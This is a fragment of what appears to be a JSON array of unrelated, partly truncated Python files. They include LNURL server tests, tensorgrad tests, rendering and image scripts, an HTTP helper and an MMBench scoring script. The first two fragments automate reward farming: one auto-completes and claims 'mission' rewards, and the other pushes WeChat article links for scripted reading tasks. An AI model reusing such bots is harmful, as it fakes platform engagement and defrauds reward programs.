[]\n    xmissions = []\n    mission_items = []\n\n    for i, mission in enumerate(missions):\n        if f\"M{i}\" in completed_missions:\n            continue\n        xmissions.append(f\"M{i}\")\n        join_mission(f\"M{i}\", auth)\n        \n        for y, item in enumerate(mission['items']):\n            if item['type'] in ['x', 'discord', 'website', 'tg']:\n                mission_items.append([f\"M{i}\", y])\n                finish_mission_item(f\"M{i}\", y, auth)\n        \n    time.sleep(random.randint(30, 36))\n    \n    for i, y in mission_items:\n        finish_mission_item(i, y, auth)\n    \n    for mission_id in xmissions:\n        finish_mission(mission_id, auth)\n        time.sleep(2)\n        claim_reward(auth, mission_id)\n            \ndef join_mission(mission:str, auth:str):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"sam",
    "# -*- coding: utf-8 -*-\n# push_utils.py created by MoMingLog on 29/3/2024.\n\"\"\"\n\u3010\u4f5c\u8005\u3011MoMingLog\n\u3010\u521b\u5efa\u65f6\u95f4\u30112024-03-29\n\u3010\u529f\u80fd\u63cf\u8ff0\u3011\n\"\"\"\nimport re\nimport time\n\nimport httpx\n\nfrom config import storage_cache_config, load_wx_business_access_token\nfrom utils import global_utils, md5\n\n\nclass WxPusher:\n\n    @classmethod\n    def push_article(cls, appToken: str, title: str, link: str, uids: str | list = None, topicIds: str | list = None):\n        content = f'''<body onload=\"window.location.href='{link}'\"><p><b>{title}\u6587\u7ae0\u68c0\u6d4b</b></p></body>'''\n        print(f\"\ud83d\ude9b\ud83d\ude9b \u6587\u7ae0\u63a8\u9001\u4e2d ->{link}\")\n        if WxPusher.push_core(appToken, title, content, url=link, uids=uids, topicIds=topicIds):\n            print(\"> \ud83d\udfe2\ud83d\udfe1 \u6587\u7ae0\u63a8\u9001\u6210\u529f! \u8bf7\u5c3d\u5feb\u70b9\u51fb!\")\n            return True\n        print(\"> \ud83d\udd34\u274c\ufe0f \u6587\u7ae0\u63a8\u9001\u5931\u8d25! \")\n        return False\n\n    @classmethod\n    def push_msg(cls, appToken: str, title: str, content: str, uids: str | list = None, topicIds: str | list = None):\n        if WxPusher.push_core(appToken, title, content, content_type=1, uids=uids, topicIds=topicIds):\n            print(\"> \ud83d\udfe2\ud83d\udfe1 \u6d88\u606f\u63a8\u9001\u6210\u529f!\")\n            return True\n        print(\"> \ud83d\udd34\u274c\ufe0f \u6d88\u606f\u63a8\u9001\u5931\u8d25! \")\n        return False\n\n    @classmethod\n    def push_core(cls, appToken, title, content, url: str = None, content_type: int = 2, uids: str | list = None,\n                  topicIds: str | list = None):\n        if isinstance(uids, str):\n            uids = [uids]\n        if isinstance(topicIds, str):\n            topicIds = [topicIds]\n        data = {\n            \"appToken\": appToken,\n            \"content\": content,\n            \"summary\": title,\n            \"contentType\": content_type,\n            \"uids\": uids or [],\n            \"topicIds\": topicIds or [],\n        }\n        if url:\n            data[\"url\"] = url\n\n        url = \"https://wxpusher.zjiecode.com/api/send/message\"\n        max_retry = 3\n        while max_retry > 0:\n            try:\n                response = httpx.post(url, json=data)\n                if response.json().get(\"code\") == 1000:\n                    return True\n                time.sleep(1)\n            except Exception as e:\n                print(f\"Error occurred: {e}\")\n                time.sleep(1)\n            max_retry -= 1\n        return False\n\n\nclass WxBusinessPusher:\n    USER_NAME_COMPILE = re.compile(r\"\u7528\u6237.*?(.*)\")\n    TURN_COUNT_COMPILE = re.compile(r\"\u8f6e\u6570.*?(\\d+)\")\n    CHAPTER_COUNT_COMPILE = re.compile(r\"\u7bc7\u6570.*?(\\d+)\")\n    READ_CHAPTER_COUNT_COMPILE = re.compile(r\"\u5df2\u8bfb.*?(\\d+)\")\n    CURRENT_CHAPTER_COUNT_COMPILE = re.compile(r\"\u5f53\u524d.*?(\\d+)\")\n\n    @staticmethod\n    def handle_read_situation(situation: str | tuple, is_robot: bool = False):\n        \"\"\"\n        \u5904\u7406\u9605\u8bfb\u60c5\u51b5\n        :return:\n        \"\"\"\n        user_info = None\n        if is_robot:\n            user_info = f\"> \u7528\u6237: <font color=\\\"info\\\">{situation[0]}</font>\\n\"\n        else:\n            if isinstance(situation, str):\n                if r := WxBusinessPusher.USER_NAME_COMPILE.search(situation):\n                    user_info = f'<div class=\"highlight\">> \u7528\u6237: {r.group(1)}</div>'\n            else:\n                user_info = f'<div class=\"highlight\">> \u7528\u6237: {situation[0]}</div>'\n\n        msg_list = []\n        if isinstance(situation, tuple):\n            msg_list.extend([\n                f\"> \u8f6e\u6570: {situation[1]}\",\n                f\"> \u7bc7\u6570: {situation[2]}\",\n                f\"> \u5df2\u8bfb: {situation[3]}\",\n                f\"> \u5f53\u524d: {situation[4]}\",\n            ])\n        elif isinstance(situation, str):\n            # \u5c1d\u8bd5\u6309\u7167\u56fa\u5b9a\u683c\u5f0f\u63d0\u53d6\n            if r := WxBusinessPusher.TURN_COUNT_COMPILE.search(situation):\n                msg_list.append(f\"> \u8f6e\u6570: {r.group(1)}\")\n            if r := WxBusinessPusher.CHAPTER_COUNT_COMPILE.search(situation):\n                msg_list.append(f\"> \u7bc7\u6570: {r.group(1)}\")\n            if r := WxBusinessPusher.READ_CHAPTER_COUNT_COMPILE.search(situation):\n                msg_list.append(f\"> \u5df2\u8bfb: {r.group(1)}\")\n            if r := WxBusinessPusher.CURRENT_CHAPTER_COUNT_COMPILE.search(situation):\n                msg_list.append(f\"> \u5f53\u524d: {r.group(1)}\")\n\n        return user_info + \"\\n\".join(msg_list)\n\n    @staticmethod\n    def push_article_by_robot(webhook: str, title: str, link: str, is_markdown: bool = False,\n                              situation: str | tuple = None, tips: str = None,\n                              **kwargs):\n        \"\"\"\n        \u901a\u8fc7\u4f01\u4e1a\u5fae\u4fe1\u673a\u5668\u4eba\u63a8\u9001\u6587\u7ae0\n\n        \u53c2\u8003\u6587\u7ae0\uff1ahttps://developer.work.weixin.qq.com/document/path/91770\n\n        :param key:\n        :return:\n        \"\"\"\n\n        if is_markdown:\n            situation = WxBusinessPusher.handle_read_situation(situation, is_robot=True)\n            msg_type = \"markdown\"\n            s = f'''\n# {title}\n\n\u3010\u5f53\u524d\u9605\u8bfb\u60c5\u51b5\u3011\n{situation}\n\n\u3010Tips\u3011\n> <font color=\"warning\">{tips}</font>\n\n----> [\u524d\u5f80\u9605\u8bfb]({link})\n\n----> {global_utils.get_date()}'''\n        else:\n            s = link\n            msg_type = \"text\"\n        data = {\n            \"msgtype\": msg_type,\n            msg_type: {\n                \"content\": s\n            }\n        }\n        print(f\"> \ud83d\ude9b\ud83d\ude9b \u6587\u7ae0\u63a8\u9001\u4e2d ->{link}\")\n        max_retry = 3\n        while max_retry > 0:\n            try:\n   ",
    "import json\n\nfrom fastapi.testclient import TestClient\nfrom lnurl import (\n    LnurlPayActionResponse,\n    LnurlPayResponse,\n)\n\nfrom .main import app_factory\n\napp = app_factory()\ntest_client = TestClient(app)\n\n\ndef test_read_main():\n    response = test_client.get(\"/\")\n    assert response.status_code == 400\n    assert response.json() == {\"status\": \"ERROR\", \"reason\": \"HTTPException \"}\n\n\ndef test_lnurl_get_lud01():\n    response = test_client.get(\"/lnurl\")\n    assert response.status_code == 200\n    assert response.text.startswith(\"<!DOCTYPE html>\")\n    # Some basic checks to ensure config from `test.env` made it through:\n    assert 'href=\"lnurlp:satoshi@127.0.0.1\"' in response.text\n    assert (\n        'href=\"lightning:LNURL1DP68GURN8GHJ7VFJXUHRQT3S9CCJ7MRWW4EXCUP0WDSHGMMNDP5S4SDZXR\"'\n        in response.text\n    )\n    assert (\n        \"nostr:npub10pensatlcfwktnvjjw2dtem38n6rvw8g6fv73h84cuacxn4c28eqyfn34f\"\n        in response.text\n    )\n\n\ndef test_lnurl_pay_request_lud06_happy():\n    response = test_client.get(\"/lnurlp/satoshi\")\n    assert LnurlPayResponse.parse_obj(response.json()) == LnurlPayResponse.parse_obj(\n        dict(\n            callback=\"https://127.0.0.1/lnurlp/satoshi/callback\",\n            # NOTE these are millisat values\n            minSendable=1_000_000,\n            maxSendable=500_000_000,\n            metadata=json.dumps(\n                [\n                    [\"text/plain\", \"Zap satoshi some sats\"],\n                    [\"text/identifier\", \"satoshi@127.0.0.1\"],\n                ]\n            ),\n        )\n    )\n    assert response.status_code == 200\n\n\ndef test_lnurl_pay_request_lud06_unknown_user():\n    response = test_client.get(\"/lnurlp/notsatoshi\")\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": \"Unknown user\",\n    }\n    assert response.status_code == 404\n\n\ndef test_lnurl_pay_request_lud06_bad_user():\n    response = test_client.get(\"/lnurlp/BOBBYTABLES\")\n    # NOTE this error message is less verbose when `DEBUG=False`\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": (\n            \"RequestValidationError 1 validation error for Request\\n\"\n            \"path -> username\\n\"\n            '  string does not match regex \"^[a-z0-9-_\\\\.]+$\" '\n            \"(type=value_error.str.regex; pattern=^[a-z0-9-_\\\\.]+$)\"\n        ),\n    }\n    assert response.status_code == 400\n\n\ndef test_lnurl_pay_request_lud16_happy():\n    response = test_client.get(\"/.well-known/lnurlp/satoshi\")\n    assert LnurlPayResponse.parse_obj(response.json()) == LnurlPayResponse.parse_obj(\n        dict(\n            callback=\"https://127.0.0.1/lnurlp/satoshi/callback\",\n            # NOTE these are millisat values\n            minSendable=1_000_000,\n            maxSendable=500_000_000,\n            metadata=json.dumps(\n                [\n                    [\"text/plain\", \"Zap satoshi some sats\"],\n                    [\"text/identifier\", \"satoshi@127.0.0.1\"],\n                ]\n            ),\n        )\n    )\n    assert response.status_code == 200\n\n\ndef test_lnurl_pay_request_lud16_unknown_user():\n    response = test_client.get(\"/.well-known/lnurlp/notsatoshi\")\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": \"Unknown user\",\n    }\n    assert response.status_code == 404\n\n\ndef test_lnurl_pay_request_lud16_bad_user():\n    response = test_client.get(\"/.well-known/lnurlp/BOBBYTABLES\")\n    # NOTE this error message is less verbose when `DEBUG=False`\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": (\n            \"RequestValidationError 1 validation error for Request\\n\"\n            \"path -> username\\n\"\n            '  string does not match regex \"^[a-z0-9-_\\\\.]+$\" '\n            \"(type=value_error.str.regex; pattern=^[a-z0-9-_\\\\.]+$)\"\n        ),\n    }\n    assert response.status_code == 400\n\n\ndef test_lnurl_pay_request_callback_lud06_happy():\n    # NOTE we need to use a test client context to ensure lifespan\n    # startup/teardown code is run, otherwise `app.state...` may not exist\n    with TestClient(app) as local_client:\n        response = local_client.get(\n            \"/lnurlp/satoshi/callback\",\n            # NOTE the amount here is millisatoshis\n            params=[(\"amount\", 1337 * 1000)],\n        )\n    assert LnurlPayActionResponse.parse_obj(\n        response.json()\n    ) == LnurlPayActionResponse.parse_obj(\n        dict(\n            pr=(\n                \"lntb1u1pnquurmpp5xr83mlrg4d79e5w8nsrq6fksq83kreptr8uvcyy3\"\n                \"0r2fsve9n6fqcqpjsp5ut3l5lvwpwyjcqf508nzdtze65zl2yycm45uee\"\n                \"elktu3phzv2fsq9q7sqqqqqqqqqqqqqqqqqqqsqqqqqysgqdrytddjyar\"\n                \"90p69ctmsd3skjm3z9s395ctsypekzar0wd5xjgja93djyar90p69ctmf\"\n                \"v3jkuarfve5k2u3z9s38xct5daeks6fzt4wsmqz9grzjqwfn3p9278ttz\"\n                \"zpe0e00uhyxhned3j5d9acqak5emwfpflp8z2cnflcdkeu6euv7gsqqqq\"\n                \"lgqqqqqeqqjqvyrulmkm8x58s9vahdm3z7jlj00pgl04xhfd0gjlm0e5e\"\n                \"z7llfg49ra6pl96808deh95ysvmxajhfse4033k2deh58mrgdjj8kz8s6\"\n        ",
    "import torch\nfrom einops import einsum\nfrom tensorgrad import Variable\nfrom tensorgrad.extras.expectation import Expectation\nfrom tensorgrad.tensor import Copy, Zero\nfrom tensorgrad.utils import assert_close, rand_values\n\n\ndef test_names():\n    x = Variable(\"x\", \"i, j\")\n    mu = Variable(\"x\", \"i, j\")\n    covar = Variable(\"c\", \"i, i2, j, j2\")\n    res = Expectation(x, x, mu, covar).simplify()\n    assert res.is_isomorphic(mu, match_edges=True)\n\n    # The expectation of a X transposed should be mu transposed\n    xt = x.rename({\"i\": \"j\", \"j\": \"i\"})\n    mut = mu.rename({\"i\": \"j\", \"j\": \"i\"})\n    res = Expectation(xt, x, mu, covar).simplify()\n    assert res.is_isomorphic(mut, match_edges=True)\n\n    # The expectation of the outer product x (x) x2 should be covar if mu = 0\n    zero = Zero([\"i\", \"j\"])\n    x2 = x.rename({\"i\": \"i2\", \"j\": \"j2\"})\n    res = Expectation(x @ x2, x, zero, covar).simplify()\n    assert res.is_isomorphic(covar, match_edges=True)\n\n    x2t = x2.rename({\"i2\": \"j2\", \"j2\": \"i2\"})\n    covart = covar.rename({\"i\": \"j\", \"i2\": \"j2\", \"j\": \"i\", \"j2\": \"i2\"})\n    res = Expectation(xt @ x2t, x, zero, covar).simplify()\n    assert res.is_isomorphic(covart, match_edges=True)\n\n\ndef test_quadratic():\n    X = Variable(\"X\", \"i, j\")\n    A = Variable(\"A\", \"j, j1\")\n    ts = rand_values([X, A], i=2, j=3, j1=3)\n    ts[A] = ts[A] ** 2  # Make it more distinguishable\n\n    mu = Zero(\"i, j\", link=X)\n    covar = Copy(\"i, k\", link=X) @ Copy(\"j, l\", link=X)\n\n    expr = X.rename({\"i\": \"i0\"}) @ A @ X.rename({\"j\": \"j1\"})\n    assert set(expr.edges) == {\"i0\", \"i\"}\n\n    res = Expectation(expr, X, mu, covar).simplify().evaluate(ts, dims={\"i\": 2})\n    expected = ts[A].rename(None).trace() * torch.eye(2).rename(\"i0\", \"i\")\n    assert_close(res, expected)\n\n\ndef test_quartic():\n    X = Variable(\"X\", \"i, j\")\n    A = Variable(\"A\", \"j, j1\")\n    B = Variable(\"B\", \"i, i1\")\n    C = Variable(\"C\", \"j, j1\")\n    expr = (\n        X.rename({\"i\": \"i0\"})\n        @ A\n        @ X.rename({\"j\": \"j1\"})\n        @ B\n        @ X.rename({\"i\": \"i1\"})\n        @ C\n        @ X.rename({\"j\": \"j1\"})\n    )\n    mu = Zero([\"i\", \"j\"])\n    covar = Copy([\"i\", \"k\"]) @ Copy([\"j\", \"l\"])\n    assert covar.edges == [\"i\", \"k\", \"j\", \"l\"]\n    expr = Expectation(expr, X, mu, covar).full_simplify()\n\n    ts = rand_values([X, A, B, C], i=2, i0=2, i1=2, j=3, j1=3)\n    ts[A] = ts[A] ** 2\n    ts[B] = ts[B] ** 2\n    ts[C] = ts[C] ** 2\n    tA, tB, tC = ts[A].rename(None), ts[B].rename(None), ts[C].rename(None)\n\n    res = expr.evaluate(ts, dims={\"i\": 2})\n    expected = (\n        tA.trace() * tC.trace() * tB\n        + (tA.T @ tC).trace() * tB.T\n        + (tA @ tC).trace() * tB.trace() * torch.eye(2)\n    ).rename(\"i0\", \"i\")\n    assert_close(res, expected)\n\n\ndef test_quartic2():\n    X = Variable(\"X\", \"i, j\")\n    A = Variable(\"A\", \"j, j1\")\n    B = Variable(\"B\", \"i, i1\")\n    C = Variable(\"C\", \"j, j1\")\n    expr = (\n        X.rename({\"i\": \"i0\"})\n        @ A\n        @ X.rename({\"j\": \"j1\"})\n        @ B\n        @ X.rename({\"i\": \"i1\"})\n        @ C\n        @ X.rename({\"j\": \"j1\"})\n    )\n    M = Variable(\"M\", [\"i\", \"j\"])\n    Sh = Variable(\"Sh\", [\"j\", \"l\"])\n    S = (Sh.rename({\"j\": \"j0\"}) @ Sh).rename({\"j0\": \"j\", \"j\": \"l\"})\n    covar = Copy([\"i\", \"k\"]) @ S\n    assert covar.edges == [\"i\", \"k\", \"j\", \"l\"]\n    expr = Expectation(expr, X, M, covar).full_simplify()\n\n    i, j = 2, 3\n    ts = rand_values([X, A, B, C, M, Sh], i=i, i0=i, i1=i, j=j, j1=j, k=i, l=j)\n    ts[A] = ts[A] ** 2\n    ts[B] = ts[B] ** 2\n    ts[C] = ts[C] ** 2\n    tA, tB, tC, tSh = ts[A].rename(None), ts[B].rename(None), ts[C].rename(None), ts[Sh].rename(None)\n\n    m = 10**6\n    X = torch.randn(m, i, j) @ tSh.T\n\n    expected_covar = torch.cov(X.reshape(-1, j).T).rename(\"j\", \"l\")\n    assert_close(S.evaluate(ts), expected_covar, rtol=0.05, atol=1e-2)\n\n    print(f\"{ts[M]=}\")\n    X += ts[M].rename(None)\n\n    expected = (\n        einsum(X, tA, X, tB, X, tC, X, \"b i0 j, j j1, b i1 j1, i1 i2, b i2 j2, j2 j3, b i j3 -> b i0 i\")\n        .mean(0)\n        .rename(\"i0\", \"i\")\n    )\n\n    res = expr.evaluate(ts, dims={\"i\": i})\n    assert_close(res, expected, rtol=0.05, atol=0.01)\n",
    "from typing import List\nfrom fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse\nfrom pydantic import BaseModel\n\n\nimport instructor\nimport openai\n\napp = FastAPI()\nclient = instructor.from_openai(openai.OpenAI(), model=\"gpt-4-turbo-preview\")\n\n\nclass Property(BaseModel):\n    name: str\n    value: str\n\n\nclass User(BaseModel):\n    name: str\n    age: int\n    properties: List[Property]\n\n\n@app.post(\"/v1/extract_user\", response_model=User)\ndef extract_user(text: str):\n    user = client.chat.completions.create(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n    return user\n\n\n@app.post(\"/v1/extract_user_stream\")\ndef extract_user_stream(text: str):\n    user_stream = client.chat.completions.create_partial(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n\n    def stream():\n        for partial_user in user_stream:\n            yield f\"data: {partial_user.model_dump_json()}\\n\\n\"\n\n    return StreamingResponse(stream(), media_type=\"text/event-stream\")\n",
    "import random\n\nimport cv2\nimport os\n\nimport tempfile\nimport threading\nfrom subprocess import call\n\nimport numpy as np\nfrom scipy.io import wavfile\nimport pyrender\n\nfrom psbody.mesh import Mesh\n\nimport librosa\n\nfrom tqdm import tqdm\n\n# import open3d as o3d\nfrom data_utils.utils import load_wav_old\nfrom voca.rendering import render_mesh_helper\n\n\nclass Struct(object):\n    def __init__(self, **kwargs):\n        for key, val in kwargs.items():\n            setattr(self, key, val)\n\n\ndef get_sen(i, num_video, i_frame, pos):\n    if num_video == 1:\n        sen = 'GT'\n    elif num_video == 2:\n        if i == 0:\n            if pos == 1:\n                sen = 'A'\n            elif pos == 2:\n                sen = 'B'\n            else:\n                sen = 'GT'\n        else:\n            if pos == 1:\n                sen = 'B'\n            elif pos == 2:\n                sen = 'A'\n            else:\n                sen = 'result'\n    elif num_video == 3:\n        if i == 0:\n            sen = 'sample1'\n        elif i == 1:\n            sen = 'interpolation'\n        else:\n            sen = 'sample2'\n    elif num_video == 9 or num_video == 16:\n        if i == 0:\n            sen = 'frame '+str(i_frame)\n        else:\n            sen = 'sample' + str(i)\n    elif num_video == 12:\n        if i == 0:\n            sen = 'sample1'\n        elif i < 11:\n            sen = 'interpolation' + str(i)\n        else:\n            sen = 'sample2'\n\n    return sen\n\n\ndef add_image_text(img, text, color=(0,0,255), w=800, h=800):\n    font = cv2.FONT_HERSHEY_SIMPLEX\n    textsize = cv2.getTextSize(text, font, 8, 2)[0]\n    textX = (img.shape[1] - textsize[0]) // 2\n    textY = textsize[1] + 10\n    # img = img.copy()\n    # a = img * 255\n    # img = a.transpose(1, 2, 0).astype(np.uint8).copy()\n    # cv2.putText(img, '%s' % (text), (textX, textY), font, 1, (0, 0, 0), 2, cv2.LINE_AA)\n\n    # w = int(text)\n\n    # img = img.transpose(1, 2, 0)\n    img = np.require(img, dtype='f4', requirements=['O', 'W'])\n    img.flags.writeable = True\n    img1 = img.copy()\n    img1 = cv2.putText(img1, '%s' % (text), (100, 100), font, 2, color, 2, 1)\n    img1 = cv2.rectangle(img1, (0, 0), (w, h), color, thickness=3, )\n\n    # img1 = img1.transpose(2, 0, 1)\n\n    return img1\n\n\nclass RenderTool():\n    def __init__(self, out_path):\n        self.template_mesh = Mesh()\n        path = os.path.join(os.getcwd(), 'visualise/smplx/SMPLX_NEUTRAL.npz')\n        model_data = np.load(path, allow_pickle=True)\n        data_struct = Struct(**model_data)\n        self.template_mesh.f = data_struct.f\n        self.out_path = out_path\n        if not os.path.exists(self.out_path):\n            os.makedirs(self.out_path)\n\n    def _render_sequences(self, cur_wav_file, v_list, j=-1, mask=None, stand=False, face=False, whole_body=False, run_in_parallel=False, transcript=None, multi_view=False):\n        # import sys\n        # if sys.platform == 'win32':\n        symbol = '/'\n        cur_wav_file = cur_wav_file.replace(\"\\\\\", \"/\")\n        # else:\n        #     symbol = '\\\\'\n        print(\"Render {} {} sequence.\".format(cur_wav_file.split(symbol)[-2],cur_wav_file.split(symbol)[-1]))\n        if run_in_parallel:\n            thread = threading.Thread(target=self._render_helper, args=(cur_wav_file, v_list))\n            thread.start()\n            thread.join()\n        else:\n            directory = os.path.join(self.out_path, cur_wav_file.split(symbol)[-2])\n            if not os.path.exists(directory):\n                os.makedirs(directory)\n            video_fname = os.path.join(directory, '%s.mp4' % cur_wav_file.split(symbol)[-1].split('.')[-2])\n            # directory = os.path.join(self.out_path, cur_wav_file.split(symbol)[2].split(symbol)[0])\n            # if not os.path.exists(directory):\n            #     os.makedirs(directory)\n            # if j == -1:\n            #     video_fname = os.path.join(directory, '%s.mp4' % cur_wav_file.split(symbol)[-1].split('.')[-2].split(symbol)[-1])\n            # elif j == -2:\n            #     video_fname = os.path.join(directory, cur_wav_file.split(symbol)[-3]+'--%s.mp4' % cur_wav_file.split(symbol)[-1].split('.')[-2].split(symbol)[-1])\n            # else:\n            #     video_fname = os.path.join(directory, str(j)+'_%s.mp4' % cur_wav_file.split(symbol)[-1].split('.')[-2].split(symbol)[-1])\n            if multi_view:\n                for k in range(0, 8):\n                    former, latter = video_fname.split('.')\n                    former = former + '_r' + str(k)\n                    video_fname = former+'.'+latter\n                    self._render_change_view(video_fname, cur_wav_file, v_list, stand, face, whole_body, transcript,\n                                                  mask, k)\n            else:\n                self._render_sequences_helper(video_fname, cur_wav_file, v_list, stand, face, whole_body, transcript, mask)\n\n    def _render_change_view(self, video_fname, cur_wav_file, v_list, stand, face, whole_body, transcript, mask, rotation_times):\n\n        print('checking exis",
    "import cv2\nimport numpy as np\nimport torch\nfrom tqdm import tqdm\nimport os\nimport argparse\n\ndef img2tensor(imgs, bgr2rgb=True, float32=True):\n    \"\"\"Numpy array to tensor.\n\n    Args:\n        imgs (list[ndarray] | ndarray): Input images.\n        bgr2rgb (bool): Whether to change bgr to rgb.\n        float32 (bool): Whether to change to float32.\n\n    Returns:\n        list[tensor] | tensor: Tensor images. If returned results only have\n            one element, just return tensor.\n    \"\"\"\n\n    def _totensor(img, bgr2rgb, float32):\n        if img.shape[2] == 3 and bgr2rgb:\n            if img.dtype == 'float64':\n                img = img.astype('float32')\n            img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n        img = torch.from_numpy(img.transpose(2, 0, 1))\n        if float32:\n            img = img.float()\n        return img\n\n    if isinstance(imgs, list):\n        return [_totensor(img, bgr2rgb, float32) for img in imgs]\n    else:\n        return _totensor(imgs, bgr2rgb, float32)\n    \ndef get_opt():\n    parser = argparse.ArgumentParser()\n    # parser.add_argument('--name', type=str, required=True)\n\n    parser.add_argument('--warped_path', type=str, default='/home/ock/aigc/GP-VTON-main/sample/viton_hd/train_paired/warped')\n    parser.add_argument('--mask_path', type=str, default='/home/ock/aigc/GP-VTON-main/sample/viton_hd/train_paired/mask')\n    parser.add_argument('--output_folder', type=str, default='/home/ock/aigc/Try-On-old/highlight/train')\n\n    opt = parser.parse_args()\n    return opt\n\nif __name__ == '__main__':\n    opt = get_opt()\n    warped_path = opt.warped_path\n    warped_mask_path = opt.mask_path\n    output_folder =  opt.output_folder\n    os.makedirs(output_folder,exist_ok=True)\n\n    for filename in tqdm(os.listdir(warped_path)):\n        if filename.endswith(\".jpg\") or filename.endswith(\".png\"): \n            image_path = os.path.join(warped_path, filename)\n            mask_path = os.path.join(warped_mask_path, filename)\n            img = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)\n            mask =  cv2.imread(mask_path, cv2.IMREAD_GRAYSCALE)\n            kernel = np.ones((3, 3), np.uint8)\n            eroded_mask = cv2.erode(mask, kernel, iterations=3)\n\n            sobelx = cv2.Sobel(img, cv2.CV_64F, 1, 0, ksize=3)\n            sobely = cv2.Sobel(img, cv2.CV_64F, 0, 1, ksize=3)\n            gradient = cv2.addWeighted(cv2.convertScaleAbs(sobelx), 0.5, cv2.convertScaleAbs(sobely), 0.5, 0) #* (1-mask)\n            gradient[eroded_mask == 0] = 0\n            save_path = os.path.join(output_folder, filename)\n            cv2.imwrite(save_path,gradient)\n",
    "import asyncio\nimport asyncio.exceptions\nimport importlib.util\nimport json\nimport ssl\nfrom typing import Dict, Optional, Tuple\nfrom urllib.parse import urlparse\nfrom .ass import ass\nif importlib.util.find_spec(\"aiohttp\"):\n    import aiohttp\n\n    @ass\n    async def req(url: str, data: Optional[dict] = None) -> Tuple[int, dict]:\n        try:\n            async with aiohttp.ClientSession() as client:\n                async with client.post(\n                    url, json=data, headers={\"content-type\": \"application/json\"}\n                ) as response:\n                    return response.status, await response.json()\n        except asyncio.exceptions.TimeoutError:\n            return 200, {\"result\": []}\n\nelif importlib.util.find_spec(\"httpx\"):\n    import httpx\n\n    @ass\n    async def req(url: str, data: Optional[dict] = None) -> Tuple[int, dict]:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.post(\n                    url,\n                    json=data,\n                    headers={\"content-type\": \"application/json\"},\n                    timeout=180,\n                )\n                return response.status_code, response.json()\n        except httpx.ReadTimeout:\n            return 200, {\"result\": []}\n\nelse:\n    @ass\n    async def req(url: str, data: Optional[Dict] = None) -> Tuple[int, Dict]:\n        parsed_url = urlparse(url)\n        host, port = parsed_url.hostname, parsed_url.port or (443 if parsed_url.scheme == \"https\" else 80)\n\n        headers = {\n            \"Host\": host,\n            \"Content-Type\": \"application/json\"\n        }\n\n        if data is None:\n            data = {}\n\n        body = json.dumps(data).encode(\"utf-8\")\n        content_length = len(body)\n        headers[\"Content-Length\"] = str(content_length)\n\n        rb = f\"POST {parsed_url.path or '/'} HTTP/1.1\\r\\n\"\n        rb += \"\\r\\n\".join(f\"{key}: {value}\" for key, value in headers.items())\n        rb += \"\\r\\n\\r\\n\"\n        request = rb.encode(\"utf-8\") + body\n\n        reader, writer = await asyncio.open_connection(host, port, ssl=ssl.create_default_context() if parsed_url.scheme == \"https\" else None)\n        writer.write(request)\n        await writer.drain()\n\n        status_line = await reader.readline()\n        status_code = int(status_line.split()[1])\n\n        headers = {}\n        while True:\n            line = await reader.readline()\n            if line == b\"\\r\\n\":\n                break\n            key, value = line.decode(\"utf-8\").strip().split(\": \", 1)\n            headers[key] = value\n\n        response_data = b\"\"\n        content_length = int(str(headers.get(\"Content-Length\", \"0\")))\n        while True:\n            chunk = await reader.read(1024)\n            response_data += chunk\n            if len(response_data) >= content_length or not chunk:\n                break\n\n        writer.close()\n        await writer.wait_closed()\n\n        response_json = json.loads(response_data.decode(\"utf-8\"))\n        return status_code, response_json\n",
    "import pandas as pd\nimport json\nimport random\n\n'''\nThis script provides metric calculation for mmbench_dev with the same accuarcy algo as OpenCompass server\n'''\n\npredictions = json.load(open('mmbench_dev_20230712.json'))\n\nindex2predictions = {}\nfor pred in predictions:\n    index2predictions[pred['index']] = pred['prediction']\n\n\nfrom collections import Counter\n\ndef most_common_elements(lst):\n    counter = Counter(lst)\n    max_count = max(counter.values())\n    most_common = [element for element, count in counter.items() if count == max_count]\n    return random.choice(most_common) # random sample from random choice\n\ndatas = pd.read_csv(\"data/mmbench/mmbench_dev_20230712/mmbench_dev_20230712.tsv\", sep='\\t')\n\nglb_opts = ['A', 'B', 'C', 'D']\nindex2answer = {}\nindex2choices = {}\nindex2rawanswer = {}\nfor idx in range(len(datas)):\n    data = datas.iloc[idx]\n    \n    choices = []\n    for opt in glb_opts:\n        if not pd.isna(data[opt]):\n            choices.append(data[opt])\n    index2choices[data['index']] = choices\n\n    index2answer[data['index']] = glb_opts.index(data['answer'])\n    index2rawanswer[data['index']] = choices[glb_opts.index(data['answer'])]\n\nidentity_indexes = list(set([int(_ % 1e6) for _ in index2predictions.keys()]))\n\ncorrect = 0\ntotal = 0\nfor index in identity_indexes:\n    raw_preds = []\n    raw_answer = []\n    for _ in range(4):\n        cycle_index = int(_ * 1e6 + index)\n        if index2predictions.get(cycle_index, None) is not None:\n            raw_answer = index2rawanswer[cycle_index]\n            raw_pred = index2choices[cycle_index][index2predictions[cycle_index]]\n            raw_preds.append(raw_pred)\n\n    if len(set(raw_preds)) == 1:\n        if raw_preds[0] == raw_answer:\n            correct += 1\n    else:\n        result = most_common_elements(raw_preds)\n        if result == raw_answer:\n            correct += 1\n\n    total += 1\n\nprint(correct, total, correct / total * 100.)\n",
